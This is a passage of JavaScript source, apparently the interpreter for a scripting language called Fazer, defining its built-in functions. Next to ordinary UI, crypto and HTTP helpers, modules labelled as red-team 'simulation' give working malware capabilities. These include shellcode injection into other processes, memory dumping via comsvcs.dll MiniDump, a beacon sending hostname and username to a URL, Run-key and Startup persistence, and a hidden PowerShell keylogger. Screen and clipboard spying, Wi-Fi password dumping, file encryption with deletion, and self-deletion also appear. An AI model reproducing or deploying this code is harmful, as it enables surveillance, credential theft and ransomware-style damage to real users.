          const parts = String(text).split(":");
          const iv = Buffer.from(parts.shift(), "hex");
          const encryptedText = Buffer.from(parts.join(":"), "hex");
          const k = crypto.createHash("sha256").update(String(key)).digest();
          const decipher = crypto.createDecipheriv("aes-256-cbc", k, iv);
          let decrypted = decipher.update(encryptedText);
          decrypted = Buffer.concat([decrypted, decipher.final()]);
          return decrypted.toString();
        } catch (e) {
          return null;
        }
      },
      http_req: async (url, opts = {}) => {
        const u = new URL(url);
        const lib = u.protocol === "https:" ? require("https") : require("http");
        return new Promise((resolve) => {
          const req = lib.request(url, {
            method: opts.method || "GET",
            headers: opts.headers || {},
            timeout: opts.timeout || 5e3
          }, (res) => {
            const chunks = [];
            res.on("data", (c) => chunks.push(c));
            res.on("end", () => {
              const buf = Buffer.concat(chunks);
              resolve({
                status: res.statusCode,
                headers: res.headers,
                body: buf.toString(),
                raw: buf.toString("base64")
              });
            });
          });
          req.on("error", (e) => resolve({ error: e.message }));
          req.on("timeout", () => {
            req.destroy();
            resolve({ error: "timeout" });
          });
          if (opts.body) req.write(String(opts.body));
          req.end();
        });
      },
      http_parallel: async (reqs, opts = {}) => {
        if (!Array.isArray(reqs)) return [];
        const concurrency = Number(opts && opts.concurrency) || 10;
        const timeout = Number(opts && opts.timeout) || 5e3;
        const results = new Array(reqs.length);
        let index = 0;
        const worker = async () => {
          while (index < reqs.length) {
            const i = index++;
            const r = reqs[i];
            let url, options;
            if (typeof r === "string") {
              url = r;
              options = { timeout };
            } else {
              url = r.url;
              options = { ...r, timeout: r.timeout || timeout };
            }
            if (!url) {
              results[i] = { error: "No URL" };
              continue;
            }
            try {
              results[i] = await builtins.http_req(url, options);
            } catch (e) {
              results[i] = { error: e.message };
            }
          }
        };
        const workers = [];
        for (let k = 0; k < Math.min(reqs.length, concurrency); k++) {
          workers.push(worker());
        }
        await Promise.all(workers);
        return results;
      },
      // --- Red Team / Malware Dev Simulation (Educational) ---
      walk_dir: (dir) => {
        const fs2 = require("fs");
        const path2 = require("path");
        let results = [];
        const list = (d) => {
          try {
            const files = fs2.readdirSync(d);
            files.forEach((file) => {
              const full = path2.join(d, file);
              try {
                const stat = fs2.statSync(full);
                if (stat && stat.isDirectory()) {
                  list(full);
                } else {
                  results.push(full);
                }
              } catch (e) {
              }
            });
          } catch (e) {
          }
        };
        list(path2.resolve(String(dir)));
        return results;
      },
      encrypt_file: async (file, key) => {
        const fs2 = require("fs");
        const crypto2 = require("crypto");
        return new Promise((resolve) => {
          try {
            const k = crypto2.createHash("sha256").update(String(key)).digest();
            const iv = crypto2.randomBytes(16);
            const cipher = crypto2.createCipheriv("aes-256-cbc", k, iv);
            const input = fs2.createReadStream(String(file));
            const output = fs2.createWriteStream(String(file) + ".enc");
            output.write(iv);
            input.pipe(cipher).pipe(output);
            output.on("finish", () => resolve(true));
            output.on("error", () => resolve(false));
          } catch (e) {
            resolve(false);
          }
        });
      },
      decrypt_file: async (file, key) => {
        const fs2 = require("fs");
        const crypto2 = require("crypto");
        return new Promise((resolve) => {
          try {
            const fd = fs2.openSync(String(file), "r");
            const iv = Buffer.alloc(16);
            fs2.readSync(fd, iv, 0, 16, 0);
            fs2.closeSync(fd);
            const k = crypto2.createHash("sha256").update(String(key)).digest();
            const decipher = crypto2.createDecipheriv("aes-256-cbc", k, iv);
            const input = fs2.createReadStream(String(file), { start: 16 });
            const outFile = String(file).replace(/\.enc$/, "");
            const finalPath = outFile === String(file) ? String(file) + ".dec" : outFile;
            const output = fs2.createWriteStream(finalPath);
            input.pipe(decipher).pipe(output);
            output.on("finish", () => resolve(true));
            output.on("error", () => resolve(false));
          } catch (e) {
            resolve(false);
          }
        });
      },
      registry_get: (key, name) => {
        if (process.platform !== "win32") return null;
        try {
          const out = require("child_process").execSync(`reg query "${String(key)}" /v "${String(name)}"`).toString();
          const match = out.match(/REG_\w+\s+(.*)/);
          return match ? match[1].trim() : null;
        } catch (e) {
          return null;
        }
      },
      registry_set: (key, name, val) => {
        if (process.platform !== "win32") return false;
        try {
          require("child_process").execSync(`reg add "${String(key)}" /v "${String(name)}" /t REG_SZ /d "${String(val)}" /f`);
          return true;
        } catch (e) {
          return false;
        }
      },
      set_wallpaper: (path2) => {
        if (process.platform !== "win32") return false;
        const p = require("path").resolve(String(path2));
        const ps = `
          $code = @'
          using System.Runtime.InteropServices;
          public class Wallpaper {
             [DllImport("user32.dll", CharSet=CharSet.Auto)]
             public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
          }
          '@
          Add-Type $code
          [Wallpaper]::SystemParametersInfo(20, 0, "${p}", 3)
          `;
        try {
          const b642 = Buffer.from(ps, "utf16le").toString("base64");
          require("child_process").execSync(`powershell -EncodedCommand ${b642}`);
          return true;
        } catch (e) {
          return false;
        }
      },
      tcp_connect: (host, port, handler) => {
        const net = require("net");
        const client = new net.Socket();
        client.connect(Number(port), String(host));
        client.on("data", async (data) => {
          if (handler && typeof handler === "object" && handler.__fnref__) {
            await this._call(handler, [data.toString()], this.global);
          }
        });
        return {
          send: (d) => {
            try {
              client.write(String(d));
              return true;
            } catch (e) {
              return false;
            }
          },
          close: () => {
            client.destroy();
            return true;
          }
        };
      },
      // --- Fazer UI / FX Extensions ---
      ui_sparkline: (data) => {
        if (!Array.isArray(data)) return "";
        const bars = "  \u2582\u2583\u2584\u2585\u2586\u2587\u2588";
        const min = Math.min(...data);
        const max = Math.max(...data);
        const range = max - min || 1;
        return data.map((n) => {
          const i = Math.floor((n - min) / range * (bars.length - 1));
          return bars[i];
        }).join("");
      },
      effect_glitch: (text, intensity) => {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
        const str = String(text);
        let res = "";
        const p = intensity === void 0 ? 0.1 : Number(intensity);
        for (let i = 0; i < str.length; i++) {
          if (Math.random() < p) {
            res += chars[Math.floor(Math.random() * chars.length)];
          } else {
            res += str[i];
          }
        }
        return res;
      },
      ui_box: (text, title) => {
        const s = String(text);
        const t = title ? String(title) : "";
        const lines = s.split("\n");
        const w = Math.max(t.length + 4, ...lines.map((l) => l.length)) + 2;
        const top = "\u250C" + (t ? " " + t + " " : "").padEnd(w - 2, "\u2500") + "\u2510";
        const bottom = "\u2514" + "".padEnd(w - 2, "\u2500") + "\u2518";
        const content = lines.map((l) => "\u2502 " + l.padEnd(w - 4) + " \u2502").join("\n");
        return top + "\n" + content + "\n" + bottom;
      },
      // --- SECURITY & POWER MODULES (v3.0) ---
      // UI Extensions
      ui_table: (headers, rows) => {
        if (!Array.isArray(headers) || !Array.isArray(rows)) return "";
        const colWidths = headers.map((h, idx) => {
          return Math.max(
            String(h).length,
            ...rows.map((r) => String(Array.isArray(r) ? r[idx] : r).length)
          );
        });
        const line = colWidths.map((w) => "".padEnd(w + 2, "\u2500")).join("\u253C");
        const top = colWidths.map((w) => "".padEnd(w + 2, "\u2500")).join("\u252C");
        const bot = colWidths.map((w) => "".padEnd(w + 2, "\u2500")).join("\u2534");
        let out = "\u250C" + top + "\u2510\n";
        out += "\u2502" + headers.map((h, idx) => " " + String(h).padEnd(colWidths[idx]) + " ").join("\u2502") + "\u2502\n";
        out += "\u251C" + line + "\u2524\n";
        rows.forEach((row) => {
          const cols = Array.isArray(row) ? row : headers.map(() => "");
          out += "\u2502" + cols.map((c, idx) => " " + String(c).padEnd(colWidths[idx]) + " ").join("\u2502") + "\u2502\n";
        });
        out += "\u2514" + bot + "\u2518";
        return out;
      },
      crypto: {
        hash: (algo, data) => {
          try {
            return require("crypto").createHash(String(algo)).update(String(data)).digest("hex");
          } catch (e) {
            return null;
          }
        },
        hmac: (algo, key, data) => {
          try {
            return require("crypto").createHmac(String(algo), String(key)).update(String(data)).digest("hex");
          } catch (e) {
            return null;
          }
        },
        aes_encrypt: (key, text) => {
          try {
            const k = require("crypto").scryptSync(String(key), "salt", 32);
            const iv = require("crypto").randomBytes(16);
            const cipher = require("crypto").createCipheriv("aes-256-cbc", k, iv);
            let encrypted = cipher.update(String(text), "utf8", "hex");
            encrypted += cipher.final("hex");
            return iv.toString("hex") + ":" + encrypted;
          } catch (e) {
            return null;
          }
        },
        aes_decrypt: (key, text) => {
          try {
            const parts = String(text).split(":");
            const iv = Buffer.from(parts.shift(), "hex");
            const encrypted = parts.join(":");
            const k = require("crypto").scryptSync(String(key), "salt", 32);
            const decipher = require("crypto").createDecipheriv("aes-256-cbc", k, iv);
            let decrypted = decipher.update(encrypted, "hex", "utf8");
            decrypted += decipher.final("utf8");
            return decrypted;
          } catch (e) {
            return null;
          }
        },
        b64_enc: (s) => Buffer.from(String(s)).toString("base64"),
        b64_dec: (s) => Buffer.from(String(s), "base64").toString("utf8"),
        hex_enc: (s) => Buffer.from(String(s)).toString("hex"),
        hex_dec: (s) => Buffer.from(String(s), "hex").toString("utf8"),
        random: (size) => require("crypto").randomBytes(Number(size)).toString("hex"),
        // RSA
        rsa_keypair: () => {
          const { publicKey, privateKey } = require("crypto").generateKeyPairSync("rsa", {
            modulusLength: 2048,
            publicKeyEncoding: { type: "spki", format: "pem" },
            privateKeyEncoding: { type: "pkcs8", format: "pem" }
          });
          return { public: publicKey, private: privateKey };
        },
        rsa_encrypt: (pubKey, data) => {
          try {
            return require("crypto").publicEncrypt(String(pubKey), Buffer.from(String(data))).toString("base64");
          } catch (e) {
            return null;
          }
        },
        rsa_decrypt: (privKey, data) => {
          try {
            return require("crypto").privateDecrypt(String(privKey), Buffer.from(String(data), "base64")).toString();
          } catch (e) {
            return null;
          }
        },
        sign: (privKey, data) => {
          try {
            const sign = require("crypto").createSign("SHA256");
            sign.update(String(data));
            return sign.sign(String(privKey), "base64");
          } catch (e) {
            return null;
          }
        },
        verify: (pubKey, data, sig) => {
          try {
            const verify = require("crypto").createVerify("SHA256");
            verify.update(String(data));
            return verify.verify(String(pubKey), String(sig), "base64");
          } catch (e) {
            return false;
          }
        }
      },
      security: {
        shred: (path2, passes) => {
          const fs2 = require("fs");
          const p = String(path2);
          if (!fs2.existsSync(p)) return false;
          const n = Number(passes) || 3;
          try {
            const stats = fs2.statSync(p);
            const size = stats.size;
            const crypto2 = require("crypto");
            for (let i = 0; i < n; i++) {
              const buf = crypto2.randomBytes(size);
              fs2.writeFileSync(p, buf);
            }
            fs2.unlinkSync(p);
            return true;
          } catch (e) {
            return false;
          }
        },
        lock_folder: (path2) => {
          try {
            require("child_process").execSync(`attrib +h +s +r "${String(path2)}"`);
            return true;
          } catch (e) {
            return false;
          }
        },
        unlock_folder: (path2) => {
          try {
            require("child_process").execSync(`attrib -h -s -r "${String(path2)}"`);
            return true;
          } catch (e) {
            return false;
          }
        },
        encrypt_file: (path2, key) => {
          try {
            const fs2 = require("fs");
            const crypto2 = require("crypto");
            const p = String(path2);
            const data = fs2.readFileSync(p);
            const k = crypto2.scryptSync(String(key), "salt", 32);
            const iv = crypto2.randomBytes(16);
            const cipher = crypto2.createCipheriv("aes-256-cbc", k, iv);
            let encrypted = cipher.update(data);
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            fs2.writeFileSync(p + ".enc", iv.toString("hex") + ":" + encrypted.toString("hex"));
            fs2.unlinkSync(p);
            return true;
          } catch (e) {
            return false;
          }
        },
        decrypt_file: (path2, key) => {
          try {
            const fs2 = require("fs");
            const crypto2 = require("crypto");
            const p = String(path2);
            const content = fs2.readFileSync(p, "utf8");
            const parts = content.split(":");
            const iv = Buffer.from(parts.shift(), "hex");
            const encrypted = Buffer.from(parts.join(":"), "hex");
            const k = crypto2.scryptSync(String(key), "salt", 32);
            const decipher = crypto2.createDecipheriv("aes-256-cbc", k, iv);
            let decrypted = decipher.update(encrypted);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            fs2.writeFileSync(p.replace(".enc", ""), decrypted);
            return true;
          } catch (e) {
            return false;
          }
        },
        monitor: (path2, callback) => {
          const fs2 = require("fs");
          const p = String(path2);
          if (!fs2.existsSync(p)) throw new Error("Path not found");
          try {
            fs2.watch(p, { recursive: true }, async (eventType, filename) => {
              if (callback && callback.__fnref__) {
                const evt = { type: eventType, file: filename || "unknown" };
                await this._call(callback, [evt], this.global);
              }
            });
            return true;
          } catch (e) {
            return false;
          }
        },
        steg_hide: (img_path, file_path, out_path) => {
          try {
            const fs2 = require("fs");
            const img = fs2.readFileSync(String(img_path));
            const file = fs2.readFileSync(String(file_path));
            const delimiter = Buffer.from("FAZER_STEG_DATA_START::");
            const final = Buffer.concat([img, delimiter, file]);
            fs2.writeFileSync(String(out_path), final);
            return true;
          } catch (e) {
            return false;
          }
        },
        steg_reveal: (img_path, out_path) => {
          try {
            const fs2 = require("fs");
            const data = fs2.readFileSync(String(img_path));
            const delimiter = Buffer.from("FAZER_STEG_DATA_START::");
            const idx = data.indexOf(delimiter);
            if (idx === -1) return false;
            const fileData = data.subarray(idx + delimiter.length);
            fs2.writeFileSync(String(out_path), fileData);
            return true;
          } catch (e) {
            return false;
          }
        },
        firewall_block: (target) => {
          if (process.platform !== "win32") return false;
          try {
            const t = String(target);
            const isPort = /^\d+$/.test(t);
            const ruleName = "FazerBlock_" + t;
            let cmd2 = "";
            if (isPort) {
              cmd2 = `netsh advfirewall firewall add rule name="${ruleName}" dir=in action=block protocol=TCP localport=${t}`;
            } else {
              cmd2 = `netsh advfirewall firewall add rule name="${ruleName}" dir=in action=block remoteip=${t}`;
            }
            require("child_process").execSync(cmd2);
            return true;
          } catch (e) {
            return false;
          }
        }
      },
      // ──────────────────────────────────────────────────────────────────────────
      // [KEYSTORE] Encrypted Secret Store
      // ──────────────────────────────────────────────────────────────────────────
      keystore: {
        _path: null,
        _key: null,
        _data: {},
        open: (path2, masterKey) => {
          builtins.keystore._path = String(path2);
          builtins.keystore._key = String(masterKey);
          try {
            const fs2 = require("fs");
            if (fs2.existsSync(builtins.keystore._path)) {
              const enc = fs2.readFileSync(builtins.keystore._path, "utf8");
              const decrypted = builtins.crypto.aes_decrypt(builtins.keystore._key, enc);
              if (!decrypted) return false;
              builtins.keystore._data = JSON.parse(decrypted);
            } else {
              builtins.keystore._data = {};
            }
            return true;
          } catch (e) {
            return false;
          }
        },
        save: () => {
          if (!builtins.keystore._path || !builtins.keystore._key) return false;
          try {
            const json = JSON.stringify(builtins.keystore._data);
            const enc = builtins.crypto.aes_encrypt(builtins.keystore._key, json);
            require("fs").writeFileSync(builtins.keystore._path, enc);
            return true;
          } catch (e) {
            return false;
          }
        },
        set: (k, v) => {
          builtins.keystore._data[String(k)] = String(v);
        },
        get: (k) => builtins.keystore._data[String(k)]
      },
      // SQLite Module
      sqlite: {
        open: (path2) => {
          checkPerm("fs");
          let DB;
          try {
            DB = require("better-sqlite3");
          } catch (e) {
            throw new FazerError("SQLite requires 'better-sqlite3' package");
          }
          const db = new DB(String(path2));
          return {
            query: (sql, params = []) => db.prepare(String(sql)).all(params),
            exec: (sql, params = []) => db.prepare(String(sql)).run(params),
            close: () => db.close()
          };
        }
      },
      http: {
        get: async (url, headers) => {
          return await builtins.http.req("GET", url, null, headers);
        },
        post: async (url, body, headers) => {
          return await builtins.http.req("POST", url, body, headers);
        },
        req: async (method, url, body, headers) => {
          return new Promise((resolve) => {
            try {
              const u = new URL(String(url));
              const opts = {
                method: String(method),
                headers: headers ? builtins.json_parse(JSON.stringify(headers)) : {},
                timeout: 1e4
              };
              if (body) {
                const b = String(body);
                opts.headers["Content-Length"] = Buffer.byteLength(b);
              }
              const lib = u.protocol === "https:" ? require("https") : require("http");
              const req = lib.request(u, opts, (res) => {
                let data = "";
                res.on("data", (c) => data += c);
                res.on("end", () => resolve({
                  status: res.statusCode,
                  headers: res.headers,
                  body: data
                }));
              });
              req.on("error", (e) => resolve({ error: e.message }));
              req.on("timeout", () => {
                req.destroy();
                resolve({ error: "Timeout" });
              });
              if (body) req.write(String(body));
              req.end();
            } catch (e) {
              resolve({ error: e.message });
            }
          });
        },
        burst: async (urls) => {
          if (!Array.isArray(urls)) return [];
          const promises = urls.map((u) => builtins.http.get(u));
          return await Promise.all(promises);
        }
      },
      proc: {
        list: () => builtins.ps_list(),
        kill: (pid) => builtins.kill(pid),
        info: () => ({
          pid: process.pid,
          uptime: process.uptime(),
          memory: process.memoryUsage(),
          arch: process.arch,
          platform: process.platform,
          version: process.version
        }),
        dump: (pid, file) => {
          if (process.platform !== "win32") return false;
          if (builtins.sys && builtins.sys.mem_dump) return builtins.sys.mem_dump(pid, file);
          try {
            const p = require("path").resolve(String(file));
            const cmd2 = `powershell -c "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ${pid} '${p}' full"`;
            require("child_process").execSync(cmd2);
            return require("fs").existsSync(p);
          } catch (e) {
            return false;
          }
        },
        inject: (pid, shellcodeBase64) => {
          if (process.platform !== "win32") return false;
          try {
            const script = `
                  $code = "${shellcodeBase64}"
                  $bytes = [Convert]::FromBase64String($code)
                  $t = @"
                  using System;
                  using System.Runtime.InteropServices;
                  public class W {
                      [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int c);
                      [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
                      [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out IntPtr e);
                      [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);
                  }
"@
                  Add-Type -TypeDefinition $t
                  $h = [W]::OpenProcess(0x1F0FFF, $false, ${pid})
                  if ($h -eq 0) { exit 1 }
                  $p = [W]::VirtualAllocEx($h, [IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
                  if ($p -eq 0) { exit 1 }
                  [IntPtr]$out = [IntPtr]::Zero
                  [W]::WriteProcessMemory($h, $p, $bytes, $bytes.Length, [ref]$out)
                  [IntPtr]$tid = [IntPtr]::Zero
                  [W]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $p, [IntPtr]::Zero, 0, [ref]$tid)
                  `;
            const tmp = require("path").join(require("os").tmpdir(), `inj_${Date.now()}.ps1`);
            require("fs").writeFileSync(tmp, script);
            require("child_process").execSync(`powershell -ExecutionPolicy Bypass -File "${tmp}"`);
            require("fs").unlinkSync(tmp);
            return true;
          } catch (e) {
            return false;
          }
        }
      },
      implant: {
        beacon: async (url, intervalMs) => {
          const u = String(url);
          const ms = Number(intervalMs) || 5e3;
          setInterval(async () => {
            try {
              await builtins.http.req("POST", u, JSON.stringify({
                id: require("os").hostname(),
                user: require("os").userInfo().username,
                os: require("os").platform(),
                time: Date.now()
              }), { "Content-Type": "application/json" });
            } catch (e) {
            }
          }, ms);
        },
        persist: (method) => {
          try {
            const m = String(method).toLowerCase();
            const exe = process.execPath;
            const script = process.argv[1];
            const cmd2 = `"${exe}" "${script}"`;
            if (m === "startup") {
              const dest = require("path").join(process.env.APPDATA, "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "fazer_persist.lnk");
              const ps = `$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('${dest}'); $s.TargetPath = '${exe}'; $s.Arguments = '${script}'; $s.Save()`;
              require("child_process").execSync(`powershell -c "${ps}"`);
              return true;
            } else if (m === "registry") {
              require("child_process").execSync(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v FazerPersist /t REG_SZ /d "${cmd2}" /f`);
              return true;
            }
            return false;
          } catch (e) {
            return false;
          }
        }
      },
      wifi: {
        scan: () => {
          try {
            const out = require("child_process").execSync("netsh wlan show networks mode=bssid").toString();
            const networks = [];
            let current = {};
            out.split("\n").forEach((line) => {
              line = line.trim();
              if (line.startsWith("SSID")) {
                if (current.ssid) networks.push(current);
                current = { ssid: line.split(":")[1].trim() };
              } else if (line.startsWith("Signal")) {
                current.signal = line.split(":")[1].trim();
              } else if (line.startsWith("Authentication")) {
                current.auth = line.split(":")[1].trim();
              } else if (line.startsWith("BSSID")) {
                current.bssid = line.split(":")[1].trim();
              }
            });
            if (current.ssid) networks.push(current);
            return networks;
          } catch (e) {
            return [];
          }
        },
        saved: () => {
          try {
            const out = require("child_process").execSync("netsh wlan show profiles").toString();
            return out.split("\n").filter((l) => l.includes("All User Profile")).map((l) => l.split(":")[1].trim());
          } catch (e) {
            return [];
          }
        },
        dump: (ssid) => {
          try {
            const out = require("child_process").execSync(`netsh wlan show profile name="${ssid}" key=clear`).toString();
            const match = out.match(/Key Content\s*:\s*(.+)/);
            return match ? match[1].trim() : null;
          } catch (e) {
            return null;
          }
        }
      },
      steg: {
        hide: (imgIn, data, imgOut) => {
          try {
            const fs2 = require("fs");
            const buf = fs2.readFileSync(imgIn);
            const magic = Buffer.from("FAZER_STEG");
            const payload = Buffer.concat([magic, Buffer.from(String(data))]);
            fs2.writeFileSync(imgOut, Buffer.concat([buf, payload]));
            return true;
          } catch (e) {
            return false;
          }
        },
        reveal: (imgIn) => {
          try {
            const fs2 = require("fs");
            const buf = fs2.readFileSync(imgIn);
            const idx = buf.lastIndexOf("FAZER_STEG");
            if (idx === -1) return null;
            return buf.slice(idx + 10).toString();
          } catch (e) {
            return null;
          }
        },
        hide_bmp: (imgIn, data, imgOut) => {
          try {
            const fs2 = require("fs");
            let bmp = fs2.readFileSync(imgIn);
            if (bmp.slice(0, 2).toString() !== "BM") return false;
            const offset = bmp.readUInt32LE(10);
            const msg = Buffer.from(String(data) + "\0");
            const bits = [];
            for (const byte of msg) {
              for (let i = 0; i < 8; i++) bits.push(byte >> i & 1);
            }
            if (offset + bits.length > bmp.length) return false;
            for (let i = 0; i < bits.length; i++) {
              bmp[offset + i] = bmp[offset + i] & 254 | bits[i];
            }
            fs2.writeFileSync(imgOut, bmp);
            return true;
          } catch (e) {
            return false;
          }
        },
        reveal_bmp: (imgIn) => {
          try {
            const fs2 = require("fs");
            const bmp = fs2.readFileSync(imgIn);
            if (bmp.slice(0, 2).toString() !== "BM") return null;
            const offset = bmp.readUInt32LE(10);
            let chars = [];
            let currentByte = 0;
            let bitCount = 0;
            for (let i = offset; i < bmp.length; i++) {
              const bit = bmp[i] & 1;
              currentByte |= bit << bitCount;
              bitCount++;
              if (bitCount === 8) {
                if (currentByte === 0) break;
                chars.push(currentByte);
                currentByte = 0;
                bitCount = 0;
              }
            }
            return Buffer.from(chars).toString();
          } catch (e) {
            return null;
          }
        }
      },
      spy: {
        screenshot: (filename) => {
          if (process.platform !== "win32") return false;
          try {
            const out = require("path").resolve(String(filename));
            const ps = `
                  Add-Type -AssemblyName System.Windows.Forms
                  Add-Type -AssemblyName System.Drawing
                  $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
                  $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
                  $bmp = New-Object System.Drawing.Bitmap $w, $h
                  $g = [System.Drawing.Graphics]::FromImage($bmp)
                  $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
                  $bmp.Save('${out}')
                  $g.Dispose()
                  $bmp.Dispose()
                  `;
            require("child_process").execSync(`powershell -c "${ps}"`);
            return require("fs").existsSync(out);
          } catch (e) {
            return false;
          }
        },
        keys_start: (logfile) => {
          if (process.platform !== "win32") return false;
          try {
            const out = require("path").resolve(String(logfile));
            const script = `
                  $path = "${out}"
                  $code = @"
                  using System; 
                  using System.Runtime.InteropServices;
                  public class K {
                      [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
                  }
"@
                  Add-Type -TypeDefinition $code
                  while($true) {
                      for($i=8; $i -le 190; $i++) {
                          if ([K]::GetAsyncKeyState($i) -eq -32767) {
                              $k = "$i,"
                              [System.IO.File]::AppendAllText($path, $k)
                          }
                      }
                      Start-Sleep -Milliseconds 10
                  }
                  `;
            const psFile = require("path").join(require("os").tmpdir(), `k_${Date.now()}.ps1`);
            require("fs").writeFileSync(psFile, script);
            const child = require("child_process").spawn("powershell", ["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psFile], {
              detached: true,
              stdio: "ignore"
            });
            child.unref();
            return child.pid;
          } catch (e) {
            return 0;
          }
        },
        keys_stop: (pid) => {
          try {
            process.kill(Number(pid));
            return true;
          } catch (e) {
            return false;
          }
        },
        clip_mon: (callback) => {
          if (!builtins.clipboard_get) return false;
          let last2 = builtins.clipboard_get();
          setInterval(async () => {
            try {
              const curr = builtins.clipboard_get();
              if (curr !== last2) {
                last2 = curr;
                if (callback && callback.__fnref__) {
                  await this._call(callback, [curr], this.global);
                }
              }
            } catch (e) {
            }
          }, 1e3);
          return true;
        }
      },
      security: {
        shred: (path2, passes) => {
          try {
            const fs2 = require("fs");
            const p = require("path").resolve(String(path2));
            if (!fs2.existsSync(p)) return false;
            const stats = fs2.statSync(p);
            const len2 = stats.size;
            const passCount = Number(passes) || 3;
            for (let i = 0; i < passCount; i++) {
              const buf = require("crypto").randomBytes(len2);
              fs2.writeFileSync(p, buf);
            }
            const zeros = Buffer.alloc(len2, 0);
            fs2.writeFileSync(p, zeros);
            fs2.unlinkSync(p);
            return true;
          } catch (e) {
            return false;
          }
        },
        encrypt_file: (path2, key) => {
          try {
            const fs2 = require("fs");
            const crypto2 = require("crypto");
            const p = require("path").resolve(String(path2));
            const data = fs2.readFileSync(p);
            const k = crypto2.scryptSync(String(key), "salt", 32);
            const iv = crypto2.randomBytes(16);
            const cipher = crypto2.createCipheriv("aes-256-cbc", k, iv);
            let encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            const outData = Buffer.concat([iv, encrypted]);
            fs2.writeFileSync(p + ".enc", outData);
            return true;
          } catch (e) {
            return false;
          }
        },
        decrypt_file: (path2, key) => {
          try {
            const fs2 = require("fs");
            const crypto2 = require("crypto");
            const p = require("path").resolve(String(path2));
            const data = fs2.readFileSync(p);
            const iv = data.slice(0, 16);
            const content = data.slice(16);
            const k = crypto2.scryptSync(String(key), "salt", 32);
            const decipher = crypto2.createDecipheriv("aes-256-cbc", k, iv);
            let decrypted = Buffer.concat([decipher.update(content), decipher.final()]);
            const outPath = p.endsWith(".enc") ? p.slice(0, -4) : p + ".dec";
            fs2.writeFileSync(outPath, decrypted);
            return true;
          } catch (e) {
            return false;
          }
        },
        hash_file: (path2) => {
          try {
            const fs2 = require("fs");
            const crypto2 = require("crypto");
            const buf = fs2.readFileSync(String(path2));
            return crypto2.createHash("sha256").update(buf).digest("hex");
          } catch (e) {
            return null;
          }
        },
        lock_folder: (path2) => {
          if (process.platform !== "win32") return false;
          try {
            const p = require("path").resolve(String(path2));
            require("child_process").execSync(`attrib +h +s +r "${p}"`);
            return true;
          } catch (e) {
            return false;
          }
        },
        unlock_folder: (path2) => {
          if (process.platform !== "win32") return false;
          try {
            const p = require("path").resolve(String(path2));
            require("child_process").execSync(`attrib -h -s -r "${p}"`);
            return true;
          } catch (e) {
            return false;
          }
        },
        monitor: (path2, callback) => {
          try {
            const fs2 = require("fs");
            const p = require("path").resolve(String(path2));
            fs2.watch(p, async (eventType, filename) => {
              if (callback && callback.__fnref__) {
                await this._call(callback, [eventType, filename], this.global);
              }
            });
            return true;
          } catch (e) {
            return false;
          }
        }
      },
      profile: {
        start: () => {
          this.profiling = true;
          this.profileData.clear();
          return true;
        },
        stop: () => {
          this.profiling = false;
          return true;
        },
        report: () => {
          const out = {};
          for (const [k, v] of this.profileData) out[k] = v;
          return out;
        },
        trace: (enable) => {
          this.traceMode = !!enable;
          return true;
        }
      },
      self: {
        destruct: () => {
          if (process.platform !== "win32") return false;
          try {
            const f = process.execPath;
            const cmd2 = `cmd /c ping 127.0.0.1 -n 2 > nul & del "${f}"`;
            require("child_process").spawn(cmd2, { shell: true, detached: true, stdio: "ignore" }).unref();
            process.exit(0);
          } catch (e) {
            return false;
          }
        },
        melt: () => {
          try {
            require("fs").unlinkSync(process.argv[1]);
            return true;
          } catch (e) {
            return false;
          }
        }
      }
    };
    this.global.set("__builtins__", builtins, false);
    for (const [k, v] of Object.entries(builtins)) this.global.set(k, v, false);
    this.debugMode = process.env.FAZER_DEBUG === "1";
    this.breakpoints = /* @__PURE__ */ new Set();
    if (process.env.FAZER_BREAKPOINTS) {
      process.env.FAZER_BREAKPOINTS.split(",").forEach((l) => this.breakpoints.add(Number(l)));
    }
    this.debugStep = false;
    this.children = /* @__PURE__ */ new Map();
    this.profiling = false;
    this.profileData = /* @__PURE__ */ new Map();
    this.traceMode = false;
  }
  async _debugCheck(expr, scope) {
    if (!this.debugMode || !expr || !expr.loc) return;
    const line = expr.loc.start.line;
    const shouldPause = this.breakpoints.has(line) || this.debugStep;
    if (shouldPause) {
      const vars = {};
      for (const [k, v] of scope.variables) {
        if (v && typeof v === "object" && !Array.isArray(v)) vars[k] = "[Object]";
        else if (typeof v === "function") vars[k] = "[Function]";
        else vars[k] = v;
      }
      const payload = JSON.stringify({
        type: "debug_pause",
        line,
        file: "main.fz",
        vars
      });
      process.stdout.write("DEBUG_JSON:" + payload + "\n");
      await new Promise((resolve) => {
        const onData = (data) => {
          const str = data.toString().trim();
          if (str.includes("DEBUG_CMD:")) {
            const cmd2 = str.split("DEBUG_CMD:")[1].trim();
            if (cmd2 === "continue") {
              this.debugStep = false;
              process.stdin.removeListener("data", onData);
              resolve();
            } else if (cmd2 === "step") {
              this.debugStep = true;
              process.stdin.removeListener("data", onData);
              resolve();
            }
          }
        };
        process.stdin.resume();
        process.stdin.on("data", onData);
      });
    }
  }
  async run(ast2) {
    try {
      return await this._execBlock(ast2, this.global);
    } catch (e) {
      throw e;
    }
  }
  async _execBlock(stmts, scope) {
    let last2 = null;
    for (const s of stmts) {
      const v = await this._execStmt(s, scope);
      if (v instanceof ReturnSignal) return v;
      last2 = v;
    }
    return last2;
  }
